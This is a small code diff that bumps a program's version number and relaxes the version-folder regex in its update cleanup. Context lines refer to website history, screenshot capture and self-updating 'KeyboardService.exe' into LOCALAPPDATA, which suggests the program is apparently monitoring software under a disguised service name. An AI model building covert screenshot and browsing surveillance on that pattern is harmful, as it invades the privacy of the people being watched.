@@ -50,7 +50,7 @@ WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
 SCREENSHOT_CAPTURE_TIMEOUT_SECONDS = 60
-APP_VERSION = "1.2.22"
+APP_VERSION = "1.2.23"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -1840,7 +1840,7 @@ def cleanup_old_update_versions():
         if not entry.is_dir():
             continue
         parsed_version = version_tuple(entry.name)
-        if not re.fullmatch(r"\d+(?:\.\d+){0,3}", entry.name):
+        if not re.fullmatch(r"v?\d+(?:\.\d+){0,3}", entry.name, re.IGNORECASE):
             continue
         version_directories.append((parsed_version, entry.path))
     if len(version_directories) <= 2:
